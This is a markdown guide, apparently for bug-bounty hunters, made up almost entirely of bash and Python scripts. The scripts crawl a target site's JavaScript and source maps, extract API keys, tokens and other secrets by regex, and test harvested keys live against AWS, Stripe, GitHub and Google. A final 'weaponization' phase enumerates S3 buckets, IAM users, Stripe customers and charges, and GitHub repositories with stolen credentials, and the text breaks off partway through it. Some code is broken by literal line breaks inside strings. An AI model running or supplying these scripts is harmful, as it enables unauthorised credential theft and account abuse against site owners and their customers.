# 🔥 JavaScript Secrets Extraction & API Key Harvesting - Elite Edition

## 💰 High-Value Exploitation ($1000+ Bugs)

### 🎯 Target: Client-Side JavaScript Files & API Keys

---

## 🛠️ Phase 1: JavaScript Discovery & Collection

### Comprehensive JavaScript File Discovery

```bash
#!/bin/bash
# JavaScript Discovery Script
TARGET=$1

echo "🔍 Discovering JavaScript files on $TARGET"

# Create output directory
OUTPUT_DIR="js_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{raw_js,processed,secrets,wordlists}

# Method 1: Katana for deep crawling
echo "🕷️ Deep crawling with Katana..."
echo $TARGET | katana -d 5 -js-crawl -known-files all -automatic-form-fill -field-config katana_config.yaml -o $OUTPUT_DIR/all_urls.txt

# Extract JS files from crawled URLs
grep -E "\.js(\?|$)" $OUTPUT_DIR/all_urls.txt | sort -u > $OUTPUT_DIR/js_urls.txt

# Method 2: Wayback Machine for historical JS files
echo "📚 Checking Wayback Machine..."
waybackurls $TARGET | grep -E "\.js(\?|$)" | sort -u >> $OUTPUT_DIR/js_urls.txt

# Method 3: GAU (GetAllUrls) for comprehensive collection
echo "🌐 Using GAU for URL collection..."
echo $TARGET | gau | grep -E "\.js(\?|$)" | sort -u >> $OUTPUT_DIR/js_urls.txt

# Method 4: Common JS file paths
echo "📁 Testing common JS paths..."
cat > $OUTPUT_DIR/common_js_paths.txt << 'EOF'
/js/app.js
/js/main.js
/js/bundle.js
/js/vendor.js
/js/config.js
/js/api.js
/assets/js/app.js
/static/js/main.js
/dist/js/bundle.js
/build/js/app.js
/public/js/main.js
/resources/js/app.js
/wp-content/themes/*/js/*.js
/wp-includes/js/*.js
/admin/js/*.js
/dashboard/js/*.js
/api/js/*.js
/v1/js/*.js
/v2/js/*.js
/mobile/js/*.js
/app/js/*.js
/src/js/*.js
/lib/js/*.js
/scripts/*.js
/js/jquery*.js
/js/bootstrap*.js
/js/angular*.js
/js/react*.js
/js/vue*.js
EOF

# Test common paths
while read path; do
    if [[ "$path" == *"*"* ]]; then
        # Handle wildcard paths with ffuf
        base_path=$(echo $path | sed 's/\*.*$//')
        ffuf -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt -u "https://$TARGET${base_path}FUZZ.js" -mc 200 -fs 0 -t 50 -o $OUTPUT_DIR/ffuf_js_results.json -of json -s
    else
        # Direct path testing
        response=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
        if [ "$response" = "200" ]; then
            echo "https://$TARGET$path" >> $OUTPUT_DIR/js_urls.txt
        fi
    fi
done < $OUTPUT_DIR/common_js_paths.txt

# Method 5: Source map discovery
echo "🗺️ Discovering source maps..."
while read js_url; do
    # Check for source map references
    curl -s "$js_url" | grep -o "//# sourceMappingURL=.*" | cut -d= -f2 | while read map_file; do
        if [[ "$map_file" == http* ]]; then
            echo "$map_file" >> $OUTPUT_DIR/sourcemap_urls.txt
        else
            base_url=$(dirname "$js_url")
            echo "$base_url/$map_file" >> $OUTPUT_DIR/sourcemap_urls.txt
        fi
    done
done < $OUTPUT_DIR/js_urls.txt

# Remove duplicates and clean up
sort -u $OUTPUT_DIR/js_urls.txt -o $OUTPUT_DIR/js_urls.txt
sort -u $OUTPUT_DIR/sourcemap_urls.txt -o $OUTPUT_DIR/sourcemap_urls.txt 2>/dev/null

echo "✅ Found $(wc -l < $OUTPUT_DIR/js_urls.txt) JavaScript files"
echo "✅ Found $(wc -l < $OUTPUT_DIR/sourcemap_urls.txt 2>/dev/null || echo 0) source maps"
```

### JavaScript File Download & Processing

```bash
#!/bin/bash
# JavaScript Download & Processing Script
JS_URLS_FILE=$1
OUTPUT_DIR=$2

echo "📥 Downloading and processing JavaScript files..."

# Download all JS files
echo "⬇️ Downloading JavaScript files..."
counter=1
while read js_url; do
    if [ ! -z "$js_url" ]; then
        filename="js_file_$(printf "%04d" $counter).js"
        echo "Downloading: $js_url -> $filename"
        
        # Download with proper headers
        curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
             -H "Accept: application/javascript, */*" \
             -H "Accept-Language: en-US,en;q=0.9" \
             "$js_url" -o "$OUTPUT_DIR/raw_js/$filename"
        
        # Store URL mapping
        echo "$filename:$js_url" >> "$OUTPUT_DIR/url_mapping.txt"
        
        counter=$((counter + 1))
    fi
done < "$JS_URLS_FILE"

# Download source maps
if [ -s "$OUTPUT_DIR/sourcemap_urls.txt" ]; then
    echo "🗺️ Downloading source maps..."
    counter=1
    while read map_url; do
        if [ ! -z "$map_url" ]; then
            filename="sourcemap_$(printf "%04d" $counter).js.map"
            curl -s -L "$map_url" -o "$OUTPUT_DIR/raw_js/$filename"
            echo "$filename:$map_url" >> "$OUTPUT_DIR/sourcemap_mapping.txt"
            counter=$((counter + 1))
        fi
    done < "$OUTPUT_DIR/sourcemap_urls.txt"
fi

# Beautify minified JavaScript
echo "✨ Beautifying JavaScript files..."
for js_file in $OUTPUT_DIR/raw_js/*.js; do
    if [ -f "$js_file" ]; then
        filename=$(basename "$js_file")
        
        # Try multiple beautification methods
        # Method 1: js-beautify (if available)
        if command -v js-beautify &> /dev/null; then
            js-beautify "$js_file" > "$OUTPUT_DIR/processed/beautified_$filename"
        fi
        
        # Method 2: Python jsbeautifier
        python3 -c "
import jsbeautifier
try:
    with open('$js_file', 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    beautified = jsbeautifier.beautify(content)
    with open('$OUTPUT_DIR/processed/beautified_$filename', 'w', encoding='utf-8') as f:
        f.write(beautified)
except Exception as e:
    print(f'Error beautifying $filename: {e}')
"
        
        # Method 3: Simple formatting with sed (fallback)
        if [ ! -f "$OUTPUT_DIR/processed/beautified_$filename" ]; then
            sed 's/;/;
/g; s/{/{
/g; s/}/
}/g' "$js_file" > "$OUTPUT_DIR/processed/beautified_$filename"
        fi
    fi
done

echo "✅ JavaScript processing completed"
```

---

## 🔍 Phase 2: Secret Pattern Detection & Extraction

### Advanced Secret Detection Engine

```bash
#!/bin/bash
# Advanced Secret Detection Engine
PROCESSED_DIR=$1
OUTPUT_DIR=$2

echo "🔍 Advanced secret detection in JavaScript files..."

# Create comprehensive regex patterns for different secret types
cat > $OUTPUT_DIR/secret_patterns.txt << 'EOF'
# AWS Keys
AKIA[0-9A-Z]{16}
aws_access_key_id.*[=:]\s*["']?([A-Z0-9]{20})["']?
aws_secret_access_key.*[=:]\s*["']?([A-Za-z0-9/+=]{40})["']?

# Google API Keys
AIza[0-9A-Za-z\-_]{35}
google.*api.*key.*[=:]\s*["']?([A-Za-z0-9\-_]{39})["']?

# Stripe Keys
sk_live_[0-9a-zA-Z]{24}
sk_test_[0-9a-zA-Z]{24}
pk_live_[0-9a-zA-Z]{24}
pk_test_[0-9a-zA-Z]{24}

# GitHub Tokens
ghp_[A-Za-z0-9]{36}
gho_[A-Za-z0-9]{36}
ghu_[A-Za-z0-9]{36}
ghs_[A-Za-z0-9]{36}
ghr_[A-Za-z0-9]{36}

# JWT Tokens
eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*

# Database URLs
mongodb://[^\s"']+
mysql://[^\s"']+
postgresql://[^\s"']+
redis://[^\s"']+

# API Endpoints
https?://[a-zA-Z0-9\-\.]+/api/[^\s"']*
https?://api\.[a-zA-Z0-9\-\.]+[^\s"']*

# Private Keys
-----BEGIN [A-Z ]+PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN DSA PRIVATE KEY-----
-----BEGIN EC PRIVATE KEY-----

# Slack Tokens
xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}

# Discord Tokens
[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}

# Twilio
SK[a-z0-9]{32}
AC[a-z0-9]{32}

# SendGrid
SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}

# Mailgun
key-[a-z0-9]{32}

# Facebook Access Token
EAA[A-Za-z0-9]{100,}

# Twitter API Keys
[1-9][0-9]+-[0-9a-zA-Z]{40}

# Generic API Keys
api[_-]?key.*[=:]\s*["']?([a-zA-Z0-9\-_]{20,})["']?
secret.*[=:]\s*["']?([a-zA-Z0-9\-_]{20,})["']?
token.*[=:]\s*["']?([a-zA-Z0-9\-_]{20,})["']?
password.*[=:]\s*["']?([^\s"']{8,})["']?

# URLs with credentials
https?://[a-zA-Z0-9\-_]+:[a-zA-Z0-9\-_]+@[^\s"']+

# IP Addresses (internal networks)
10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}
172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}
192\.168\.[0-9]{1,3}\.[0-9]{1,3}

# Email addresses
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

# Phone numbers
\+?[1-9]\d{1,14}
\([0-9]{3}\)\s?[0-9]{3}-[0-9]{4}

# Credit card patterns
[0-9]{4}[\s\-]?[0-9]{4}[\s\-]?[0-9]{4}[\s\-]?[0-9]{4}

# Social Security Numbers
[0-9]{3}-[0-9]{2}-[0-9]{4}
EOF

# Advanced secret extraction with context
echo "🔍 Extracting secrets with context..."
python3 << 'EOF'
import re
import os
import json
from pathlib import Path

def extract_secrets(file_path, patterns_file, output_dir):
    secrets_found = []
    
    # Load patterns
    with open(patterns_file, 'r') as f:
        pattern_lines = f.readlines()
    
    patterns = []
    current_category = "Unknown"
    
    for line in pattern_lines:
        line = line.strip()
        if line.startswith('#'):
            current_category = line[1:].strip()
        elif line and not line.startswith('#'):
            patterns.append((current_category, line))
    
    # Process each JavaScript file
    for js_file in Path(file_path).glob('*.js'):
        try:
            with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = content.split('
')
            
            for category, pattern in patterns:
                matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                
                for match in matches:
                    # Find line number
                    line_num = content[:match.start()].count('
') + 1
                    
                    # Get context (surrounding lines)
                    start_line = max(0, line_num - 3)
                    end_line = min(len(lines), line_num + 2)
                    context = '
'.join(lines[start_line:end_line])
                    
                    secret_info = {
                        'file': str(js_file),
                        'category': category,
                        'pattern': pattern,
                        'match': match.group(0),
                        'line_number': line_num,
                        'context': context,
                        'confidence': calculate_confidence(match.group(0), category)
                    }
                    
                    secrets_found.append(secret_info)
        
        except Exception as e:
            print(f"Error processing {js_file}: {e}")
    
    return secrets_found

def calculate_confidence(match, category):
    """Calculate confidence score based on pattern and context"""
    confidence = 50  # Base confidence
    
    # High confidence patterns
    if any(x in category.lower() for x in ['aws', 'stripe', 'github', 'jwt']):
        confidence += 30
    
    # Check for common false positives
    if 'example' in match.lower() or 'test' in match.lower() or 'demo' in match.lower():
        confidence -= 20
    
    # Check length (longer secrets are usually more legitimate)
    if len(match) > 30:
        confidence += 10
    elif len(match) < 10:
        confidence -= 10
    
    return max(0, min(100, confidence))

# Run extraction
processed_dir = os.sys.argv[1] if len(os.sys.argv) > 1 else 'processed'
output_dir = os.sys.argv[2] if len(os.sys.argv) > 2 else 'secrets'
patterns_file = f"{output_dir}/secret_patterns.txt"

secrets = extract_secrets(processed_dir, patterns_file, output_dir)

# Sort by confidence
secrets.sort(key=lambda x: x['confidence'], reverse=True)

# Save results
with open(f"{output_dir}/extracted_secrets.json", 'w') as f:
    json.dump(secrets, f, indent=2)

# Generate summary report
categories = {}
for secret in secrets:
    cat = secret['category']
    if cat not in categories:
        categories[cat] = []
    categories[cat].append(secret)

with open(f"{output_dir}/secrets_summary.txt", 'w') as f:
    f.write("🔍 JavaScript Secrets Extraction Summary
")
    f.write("=" * 50 + "

")
    
    f.write(f"Total secrets found: {len(secrets)}
")
    f.write(f"High confidence (>70): {len([s for s in secrets if s['confidence'] > 70])}
")
    f.write(f"Medium confidence (40-70): {len([s for s in secrets if 40 <= s['confidence'] <= 70])}
")
    f.write(f"Low confidence (<40): {len([s for s in secrets if s['confidence'] < 40])}

")
    
    for category, cat_secrets in categories.items():
        f.write(f"
{category}: {len(cat_secrets)} found
")
        f.write("-" * 30 + "
")
        
        for secret in cat_secrets[:5]:  # Show top 5 per category
            f.write(f"  File: {secret['file']}
")
            f.write(f"  Match: {secret['match'][:100]}...
")
            f.write(f"  Confidence: {secret['confidence']}%
")
            f.write(f"  Line: {secret['line_number']}

")

print(f"✅ Found {len(secrets)} potential secrets")
print(f"📊 High confidence secrets: {len([s for s in secrets if s['confidence'] > 70])}")
EOF
```

### API Key Validation Engine

```bash
#!/bin/bash
# API Key Validation Engine
SECRETS_FILE=$1

echo "🔑 Validating extracted API keys..."

# Create validation script
python3 << 'EOF'
import json
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def validate_aws_key(access_key, secret_key=None):
    """Validate AWS access key"""
    try:
        import boto3
        from botocore.exceptions import ClientError
        
        if secret_key:
            client = boto3.client('sts', 
                                aws_access_key_id=access_key,
                                aws_secret_access_key=secret_key)
            response = client.get_caller_identity()
            return True, f"Valid AWS credentials for account: {response.get('Account')}"
        else:
            # Just check format for now
            if access_key.startswith('AKIA') and len(access_key) == 20:
                return True, "Valid AWS access key format (secret key needed for full validation)"
    except Exception as e:
        return False, str(e)
    
    return False, "Invalid AWS key"

def validate_stripe_key(api_key):
    """Validate Stripe API key"""
    try:
        headers = {'Authorization': f'Bearer {api_key}'}
        response = requests.get('https://api.stripe.com/v1/account', 
                              headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return True, f"Valid Stripe key for account: {data.get('display_name', 'Unknown')}"
        elif response.status_code == 401:
            return False, "Invalid Stripe API key"
        else:
            return False, f"Stripe API error: {response.status_code}"
    except Exception as e:
        return False, str(e)

def validate_github_token(token):
    """Validate GitHub token"""
    try:
        headers = {'Authorization': f'token {token}'}
        response = requests.get('https://api.github.com/user', 
                              headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return True, f"Valid GitHub token for user: {data.get('login', 'Unknown')}"
        elif response.status_code == 401:
            return False, "Invalid GitHub token"
        else:
            return False, f"GitHub API error: {response.status_code}"
    except Exception as e:
        return False, str(e)

def validate_google_api_key(api_key):
    """Validate Google API key"""
    try:
        # Test with Maps API (commonly enabled)
        response = requests.get(f'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={api_key}', 
                              timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') != 'REQUEST_DENIED':
                return True, "Valid Google API key"
            else:
                return False, "Google API key denied"
        else:
            return False, f"Google API error: {response.status_code}"
    except Exception as e:
        return False, str(e)

def validate_jwt_token(token):
    """Validate JWT token structure"""
    try:
        import base64
        
        parts = token.split('.')
        if len(parts) != 3:
            return False, "Invalid JWT structure"
        
        # Decode header and payload
        header = json.loads(base64.b64decode(parts[0] + '=='))
        payload = json.loads(base64.b64decode(parts[1] + '=='))
        
        info = f"Algorithm: {header.get('alg', 'Unknown')}"
        if 'exp' in payload:
            import datetime
            exp_time = datetime.datetime.fromtimestamp(payload['exp'])
            info += f", Expires: {exp_time}"
        if 'iss' in payload:
            info += f", Issuer: {payload['iss']}"
        
        return True, f"Valid JWT structure - {info}"
    except Exception as e:
        return False, str(e)

def validate_secret(secret_info):
    """Validate a secret based on its category"""
    category = secret_info['category'].lower()
    match = secret_info['match']
    
    try:
        if 'aws' in category:
            return validate_aws_key(match)
        elif 'stripe' in category:
            return validate_stripe_key(match)
        elif 'github' in category:
            return validate_github_token(match)
        elif 'google' in category:
            return validate_google_api_key(match)
        elif 'jwt' in category:
            return validate_jwt_token(match)
        else:
            return None, "No validation method available"
    except Exception as e:
        return False, f"Validation error: {str(e)}"

# Load secrets
secrets_file = sys.argv[1] if len(sys.argv) > 1 else 'secrets/extracted_secrets.json'

try:
    with open(secrets_file, 'r') as f:
        secrets = json.load(f)
except FileNotFoundError:
    print("Secrets file not found")
    sys.exit(1)

# Filter high-confidence secrets for validation
high_confidence_secrets = [s for s in secrets if s['confidence'] > 60]

print(f"🔍 Validating {len(high_confidence_secrets)} high-confidence secrets...")

validated_secrets = []

# Use threading for faster validation
with ThreadPoolExecutor(max_workers=5) as executor:
    future_to_secret = {executor.submit(validate_secret, secret): secret 
                       for secret in high_confidence_secrets[:20]}  # Limit to prevent rate limiting
    
    for future in as_completed(future_to_secret):
        secret = future_to_secret[future]
        try:
            is_valid, message = future.result()
            
            validation_result = {
                'secret': secret,
                'is_valid': is_valid,
                'validation_message': message,
                'validated_at': time.time()
            }
            
            validated_secrets.append(validation_result)
            
            if is_valid:
                print(f"✅ VALID: {secret['category']} - {message}")
            elif is_valid is False:
                print(f"❌ INVALID: {secret['category']} - {message}")
            else:
                print(f"❓ UNKNOWN: {secret['category']} - {message}")
                
        except Exception as e:
            print(f"❌ ERROR validating {secret['category']}: {str(e)}")
        
        time.sleep(1)  # Rate limiting

# Save validation results
output_file = secrets_file.replace('.json', '_validated.json')
with open(output_file, 'w') as f:
    json.dump(validated_secrets, f, indent=2)

valid_count = len([v for v in validated_secrets if v['is_valid'] is True])
print(f"
✅ Validation completed: {valid_count} valid secrets found")
EOF
```

---

## 🚀 Phase 3: Advanced JavaScript Analysis

### Source Map Analysis

```bash
#!/bin/bash
# Source Map Analysis Script
SOURCEMAP_DIR=$1
OUTPUT_DIR=$2

echo "🗺️ Analyzing source maps for additional secrets..."

# Process source maps
python3 << 'EOF'
import json
import base64
import sys
import os
from pathlib import Path

def analyze_sourcemap(sourcemap_file):
    """Analyze source map for original source code"""
    try:
        with open(sourcemap_file, 'r') as f:
            sourcemap = json.load(f)
        
        results = {
            'file': str(sourcemap_file),
            'sources': sourcemap.get('sources', []),
            'source_content': [],
            'secrets_found': []
        }
        
        # Extract source content
        if 'sourcesContent' in sourcemap:
            for i, content in enumerate(sourcemap['sourcesContent']):
                if content:
                    source_name = sourcemap['sources'][i] if i < len(sourcemap['sources']) else f'source_{i}'
                    results['source_content'].append({
                        'name': source_name,
                        'content': content
                    })
                    
                    # Search for secrets in source content
                    secrets = find_secrets_in_content(content, source_name)
                    results['secrets_found'].extend(secrets)
        
        return results
        
    except Exception as e:
        print(f"Error analyzing {sourcemap_file}: {e}")
        return None

def find_secrets_in_content(content, source_name):
    """Find secrets in source content"""
    import re
    
    patterns = {
        'AWS Keys': r'AKIA[0-9A-Z]{16}',
        'Google API': r'AIza[0-9A-Za-z\-_]{35}',
        'Stripe': r'sk_(live|test)_[0-9a-zA-Z]{24}',
        'GitHub': r'gh[ps]_[A-Za-z0-9]{36}',
        'JWT': r'eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*',
        'API Keys': r'api[_-]?key.*[=:]\s*["']?([a-zA-Z0-9\-_]{20,})["']?',
        'Secrets': r'secret.*[=:]\s*["']?([a-zA-Z0-9\-_]{20,})["']?',
        'Passwords': r'password.*[=:]\s*["']?([^\s"']{8,})["']?'
    }
    
    secrets = []
    lines = content.split('
')
    
    for pattern_name, pattern in patterns.items():
        matches = re.finditer(pattern, content, re.IGNORECASE)
        
        for match in matches:
            line_num = content[:match.start()].count('
') + 1
            
            # Get context
            start_line = max(0, line_num - 2)
            end_line = min(len(lines), line_num + 1)
            context = '
'.join(lines[start_line:end_line])
            
            secrets.append({
                'type': pattern_name,
                'match': match.group(0),
                'line': line_num,
                'context': context,
                'source': source_name
            })
    
    return secrets

# Process all source maps
sourcemap_dir = sys.argv[1] if len(sys.argv) > 1 else 'raw_js'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'secrets'

all_results = []

for sourcemap_file in Path(sourcemap_dir).glob('*.map'):
    print(f"Analyzing: {sourcemap_file}")
    result = analyze_sourcemap(sourcemap_file)
    if result:
        all_results.append(result)

# Save results
with open(f"{output_dir}/sourcemap_analysis.json", 'w') as f:
    json.dump(all_results, f, indent=2)

# Generate summary
total_secrets = sum(len(r['secrets_found']) for r in all_results)
total_sources = sum(len(r['sources']) for r in all_results)

with open(f"{output_dir}/sourcemap_summary.txt", 'w') as f:
    f.write("🗺️ Source Map Analysis Summary
")
    f.write("=" * 40 + "

")
    f.write(f"Source maps analyzed: {len(all_results)}
")
    f.write(f"Original sources found: {total_sources}
")
    f.write(f"Secrets in source maps: {total_secrets}

")
    
    for result in all_results:
        if result['secrets_found']:
            f.write(f"
File: {result['file']}
")
            f.write(f"Sources: {len(result['sources'])}
")
            f.write(f"Secrets: {len(result['secrets_found'])}
")
            
            for secret in result['secrets_found'][:3]:  # Show first 3
                f.write(f"  - {secret['type']}: {secret['match'][:50]}...
")

print(f"✅ Source map analysis completed: {total_secrets} secrets found")
EOF
```

### JavaScript Dependency Analysis

```bash
#!/bin/bash
# JavaScript Dependency Analysis
JS_DIR=$1
OUTPUT_DIR=$2

echo "📦 Analyzing JavaScript dependencies and libraries..."

# Create dependency analysis script
python3 << 'EOF'
import re
import json
import sys
import os
from pathlib import Path
from collections import defaultdict

def analyze_dependencies(js_content, filename):
    """Analyze JavaScript dependencies and imports"""
    dependencies = {
        'imports': [],
        'requires': [],
        'cdn_libraries': [],
        'npm_packages': [],
        'vulnerable_libraries': [],
        'config_objects': [],
        'api_endpoints': []
    }
    
    # ES6 imports
    import_pattern = r'import\s+.*?\s+from\s+["']([^"']+)["']'
    imports = re.findall(import_pattern, js_content)
    dependencies['imports'] = imports
    
    # CommonJS requires
    require_pattern = r'require\s*\(\s*["']([^"']+)["']\s*\)'
    requires = re.findall(require_pattern, js_content)
    dependencies['requires'] = requires
    
    # CDN libraries
    cdn_pattern = r'https?://[^"'\s]*(?:cdnjs|unpkg|jsdelivr|googleapis)[^"'\s]*'
    cdn_libs = re.findall(cdn_pattern, js_content)
    dependencies['cdn_libraries'] = cdn_libs
    
    # Configuration objects
    config_patterns = [
        r'config\s*[=:]\s*\{[^}]*\}',
        r'settings\s*[=:]\s*\{[^}]*\}',
        r'options\s*[=:]\s*\{[^}]*\}',
        r'API_CONFIG\s*[=:]\s*\{[^}]*\}'
    ]
    
    for pattern in config_patterns:
        matches = re.findall(pattern, js_content, re.IGNORECASE | re.DOTALL)
        dependencies['config_objects'].extend(matches)
    
    # API endpoints
    api_patterns = [
        r'https?://[a-zA-Z0-9\-\.]+/api/[^\s"']*',
        r'["']https?://api\.[a-zA-Z0-9\-\.]+[^\s"']*["']',
        r'baseURL\s*[=:]\s*["']([^"']+)["']',
        r'apiUrl\s*[=:]\s*["']([^"']+)["']'
    ]
    
    for pattern in api_patterns:
        matches = re.findall(pattern, js_content, re.IGNORECASE)
        dependencies['api_endpoints'].extend(matches)
    
    # Check for known vulnerable libraries
    vulnerable_libs = {
        'jquery': ['1.', '2.', '3.0', '3.1', '3.2', '3.3', '3.4.0'],
        'lodash': ['4.17.0', '4.17.1', '4.17.2', '4.17.3', '4.17.4'],
        'moment': ['2.18.', '2.19.', '2.20.', '2.21.', '2.22.', '2.23.', '2.24.'],
        'bootstrap': ['3.', '4.0', '4.1', '4.2', '4.3.0', '4.3.1'],
        'angular': ['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6.0', '1.6.1']
    }
    
    for lib, versions in vulnerable_libs.items():
        for version in versions:
            if re.search(f'{lib}.*{version}', js_content, re.IGNORECASE):
                dependencies['vulnerable_libraries'].append(f'{lib} {version}')
    
    return dependencies

def extract_version_info(js_content):
    """Extract version information from JavaScript"""
    version_patterns = [
        r'version\s*[=:]\s*["']([^"']+)["']',
        r'VERSION\s*[=:]\s*["']([^"']+)["']',
        r'v\d+\.\d+\.\d+',
        r'\d+\.\d+\.\d+'
    ]
    
    versions = []
    for pattern in version_patterns:
        matches = re.findall(pattern, js_content, re.IGNORECASE)
        versions.extend(matches)
    
    return list(set(versions))

# Process all JavaScript files
js_dir = sys.argv[1] if len(sys.argv) > 1 else 'processed'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'secrets'

all_dependencies = []
vulnerability_summary = defaultdict(list)

for js_file in Path(js_dir).glob('*.js'):
    try:
        with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        deps = analyze_dependencies(content, str(js_file))
        versions = extract_version_info(content)
        
        file_analysis = {
            'file': str(js_file),
            'dependencies': deps,
            'versions': versions,
            'file_size': len(content),
            'lines': content.count('
')
        }
        
        all_dependencies.append(file_analysis)
        
        # Track vulnerabilities
        for vuln in deps['vulnerable_libraries']:
            vulnerability_summary[vuln].append(str(js_file))
            
    except Exception as e:
        print(f"Error analyzing {js_file}: {e}")

# Save results
with open(f"{output_dir}/dependency_analysis.json", 'w') as f:
    json.dump(all_dependencies, f, indent=2)

# Generate summary report
with open(f"{output_dir}/dependency_summary.txt", 'w') as f:
    f.write("📦 JavaScript Dependency Analysis Summary
")
    f.write("=" * 50 + "

")
    
    total_files = len(all_dependencies)
    total_imports = sum(len(d['dependencies']['imports']) for d in all_dependencies)
    total_requires = sum(len(d['dependencies']['requires']) for d in all_dependencies)
    total_apis = sum(len(d['dependencies']['api_endpoints']) for d in all_dependencies)
    total_vulns = sum(len(d['dependencies']['vulnerable_libraries']) for d in all_dependencies)
    
    f.write(f"Files analyzed: {total_files}
")
    f.write(f"ES6 imports found: {total_imports}
")
    f.write(f"CommonJS requires found: {total_requires}
")
    f.write(f"API endpoints found: {total_apis}
")
    f.write(f"Vulnerable libraries: {total_vulns}

")
    
    if vulnerability_summary:
        f.write("🚨 VULNERABLE LIBRARIES DETECTED:
")
        f.write("-" * 40 + "
")
        for vuln, files in vulnerability_summary.items():
            f.write(f"{vuln}:
")
            for file in files[:3]:  # Show first 3 files
                f.write(f"  - {file}
")
            if len(files) > 3:
                f.write(f"  ... and {len(files) - 3} more files
")
            f.write("
")
    
    # Show unique API endpoints
    all_apis = set()
    for dep in all_dependencies:
        all_apis.update(dep['dependencies']['api_endpoints'])
    
    if all_apis:
        f.write("🌐 UNIQUE API ENDPOINTS FOUND:
")
        f.write("-" * 40 + "
")
        for api in sorted(all_apis)[:20]:  # Show first 20
            f.write(f"  - {api}
")
        if len(all_apis) > 20:
            f.write(f"  ... and {len(all_apis) - 20} more endpoints
")

print(f"✅ Dependency analysis completed: {total_vulns} vulnerabilities found")
EOF
```

---

## 🎯 Phase 4: Weaponization & Impact Assessment

### Secret Weaponization Framework

```bash
#!/bin/bash
# Secret Weaponization Framework
VALIDATED_SECRETS=$1

echo "⚔️ Weaponizing validated secrets..."

python3 << 'EOF'
import json
import requests
import sys
import time
from datetime import datetime

def weaponize_aws_credentials(access_key, secret_key):
    """Test AWS credentials for permissions"""
    try:
        import boto3
        from botocore.exceptions import ClientError
        
        # Test different AWS services
        services_to_test = ['s3', 'ec2', 'iam', 'lambda', 'rds']
        permissions = {}
        
        for service in services_to_test:
            try:
                client = boto3.client(service, 
                                    aws_access_key_id=access_key,
                                    aws_secret_access_key=secret_key)
                
                if service == 's3':
                    response = client.list_buckets()
                    permissions[service] = f"Can list {len(response['Buckets'])} buckets"
                elif service == 'ec2':
                    response = client.describe_instances()
                    permissions[service] = f"Can describe EC2 instances"
                elif service == 'iam':
                    response = client.list_users()
                    permissions[service] = f"Can list IAM users"
                elif service == 'lambda':
                    response = client.list_functions()
                    permissions[service] = f"Can list Lambda functions"
                elif service == 'rds':
                    response = client.describe_db_instances()
                    permissions[service] = f"Can describe RDS instances"
                    
            except ClientError as e:
                permissions[service] = f"Access denied: {e.response['Error']['Code']}"
            except Exception as e:
                permissions[service] = f"Error: {str(e)}"
        
        return permissions
        
    except ImportError:
        return {"error": "boto3 not installed"}
    except Exception as e:
        return {"error": str(e)}

def weaponize_stripe_key(api_key):
    """Test Stripe key permissions"""
    try:
        headers = {'Authorization': f'Bearer {api_key}'}
        
        # Test different endpoints
        endpoints = {
            'account': 'https://api.stripe.com/v1/account',
            'customers': 'https://api.stripe.com/v1/customers?limit=1',
            'charges': 'https://api.stripe.com/v1/charges?limit=1',
            'payment_intents': 'https://api.stripe.com/v1/payment_intents?limit=1',
            'subscriptions': 'https://api.stripe.com/v1/subscriptions?limit=1'
        }
        
        permissions = {}
        for endpoint_name, url in endpoints.items():
            try:
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if endpoint_name == 'account':
                        permissions[endpoint_name] = f"Account: {data.get('display_name', 'Unknown')}"
                    else:
                        permissions[endpoint_name] = f"Can access {endpoint_name}"
                else:
                    permissions[endpoint_name] = f"Access denied: {response.status_code}"
            except Exception as e:
                permissions[endpoint_name] = f"Error: {str(e)}"
        
        return permissions
        
    except Exception as e:
        return {"error": str(e)}

def weaponize_github_token(token):
    """Test GitHub token permissions"""
    try:
        headers = {'Authorization': f'token {token}'}
        
        # Test different endpoints
        endpoints = {
            'user': 'https://api.github.com/user',
            'repos': 'https://api.github.com/user/repos?per_page=1',
            'orgs': 'https://api.github.com/user/orgs',
            'gists': 'https://api.github.com/gists?per_page=1'
        }
        
        permissions = {}
        for endpoint_name, url in endpoints.items():
            try:
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if endpoint_name == 'user':
                        permissions[endpoint_name] = f"User: {data.get('login', 'Unknown')}"
                    elif endpoint_name == 'repos':
                        permissions[endpoint_name] = f"Can access repositories"
                    else:
                        permissions[endpoint_name] = f"Can access {endpoint_name}"
                else:
                    permissions[endpoint_name] = f"Access denied: {response.status_code}"
            except Exception as e:
                permissions[endpoint_name] = f"Error: {str(e)}"
        
        return permissions
        
    except Exception as e:
        return {"error": str(e)}

def calculate_impact_score(secret_info, permissions):
    """Calculate impact score based on secret type and permissions"""
    base_scores = {
        'aws': 100,
        'stripe': 90,
        'github': 80,
        'google': 70,
        'database': 95,
        'jwt': 60,
        'api': 50
    }
    
